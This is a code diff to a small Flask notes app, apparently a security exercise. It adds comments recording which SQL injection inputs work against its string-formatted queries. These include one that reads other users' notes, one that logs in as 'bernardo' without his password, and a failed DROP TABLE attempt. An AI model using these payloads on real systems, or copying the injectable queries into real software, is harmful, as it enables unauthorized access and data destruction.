@@ -83,6 +83,13 @@ def notes():
             db = connect_db()
             c = db.cursor()
             statement = """SELECT * from NOTES where publicID = %s""" %noteid
+            # WORKING:
+            # Put the following statement into the impot note field to import notes from another user.
+            # '' OR assocUser = 2
+            #
+            # NOT WORKING:
+            # '';DROP TABLE users -> 'sqlite3.Warning: You can only execute one statement at a time.'
+            # we wrapthe whole sql select query and we use the prepared statement for passing noteid
             c.execute(statement)
             result = c.fetchall()
             if(len(result)>0):
@@ -114,6 +121,9 @@ def login():
         db = connect_db()
         c = db.cursor()
         statement = "SELECT * FROM users WHERE username = '%s' AND password = '%s';" %(username, password)
+        # WORKING:
+        # Enter 'bernardo' the user field and the following query as a password to login as bernardo.
+        # ' OR password = (SELECT password FROM users WHERE username = 'bernardo') OR password = '
         c.execute(statement)
         result = c.fetchall()
 
@@ -134,14 +144,14 @@ def register():
     usererror = ""
     passworderror = ""
     if request.method == 'POST':
-        
-
         username = request.form['username']
         password = request.form['password']
         db = connect_db()
         c = db.cursor()
         pass_statement = """SELECT * FROM users WHERE password = '%s';""" %password
         user_statement = """SELECT * FROM users WHERE username = '%s';""" %username
+        # NOT WORKING:
+        # 'or username = 'a
         c.execute(pass_statement)
         if(len(c.fetchall())>0):
             errored = True
